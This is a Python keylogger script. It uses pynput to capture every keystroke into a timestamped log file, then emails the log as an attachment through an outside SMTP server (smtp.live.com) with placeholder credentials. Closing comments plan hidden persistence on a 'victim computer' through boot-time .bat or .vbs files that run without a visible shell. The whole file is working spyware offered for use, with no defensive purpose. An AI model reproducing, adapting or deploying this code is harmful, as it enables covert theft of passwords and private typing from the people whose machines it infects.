import datetime#import datetime for save the date when the script was launched
import time
import threading
from pynput.keyboard import Listener #import for pynput library a Listener for the keys pressed for any person

#libraries for send email
from email.mime.multipart import MIMEMultipart
from email.mime.base import MIMEBase
from smtplib import SMTP

date = datetime.datetime.now().strftime('%Y-%m-%d_%H-%M-%S')#save the actual datetime  in a var with year, month, day, hour, minute adn seconds
log = open('log_{}.txt'.format(date), 'w')#open a text file in mode write named with the actual datetime
keys = []#create list with the keys that pressed before

def keyRecorder(key):#method that record the key that was pressed
    key=str(key)#is string this var
    keys.append(key)#add keys to our list

    if key == 'Key.enter':#write on our text file 
        log.write('\n')
    elif key == 'Key.space':
        log.write(' ')
    elif key == '<96>':
        log.write('0')    
    elif key == '<97>':
        log.write('1')
    elif key == '<98>':
        log.write('2')
    elif key == '<99>':
        log.write('3')
    elif key == '<100>':
        log.write('4')
    elif key == '<101>':
        log.write('5')
    elif key == '<102>':
        log.write('6')
    elif key == '<103>':
        log.write('7')
    elif key == '<104>':
        log.write('8')
    elif key == '<105>':
        log.write('9')   
    elif key == 'Key.tab':
        log.write('%TAB% ')
    elif key == 'Key.backspace':
        log.write('%<<% ')
    elif len(keys) > 10:#limit of keys pressed and then send email whit the text, change for more characters
        log.close()#close and save our text file
        t1 = threading.Thread(name="Sending Email", target=sendEmail())#create another thread for this execution
        t1.start()
        t1.join()
        quit()
    else:
        log.write(key.replace("'", ""))

def sendEmail():
    fileName= f"Log_{date}.txt"
    message = MIMEMultipart("plain")
    message["From"] = "from@hotmail.com"
    message["To"] = "to@gmail.com"
    message["Subject"] = "LOG"
    attach = MIMEBase("application","octect-stream")
    attach.set_payload(open("log_{}.txt".format(date), "rb").read())#Add file name
    attach.add_header("content-Disposition",f'attachment; filename="{fileName}"')#new header for our attachment
    message.attach(attach)#add attachment to the message
    smtp = SMTP("smtp.live.com")#add email service that we will use
    smtp.starttls()#init service smtp
    smtp.login("from@hotmail.com", "fromPassword")
    smtp.sendmail("from@hotmail.com","to@gmail.com", message.as_string())
    smtp.quit()#close smtp service

with Listener(on_press=keyRecorder) as listener:#call the method that write in the plain text
    listener.join()#initialize the listening of keys

#things for to do: execute the script in every boot without shell 
#idea 1: install python on a victim computer and in the bat file, put: python klogger.py
#idea 2: increase time in a bat file for execution
#idea 3: task manager, start(inicio), open file location (whatever) and put the vbs file there





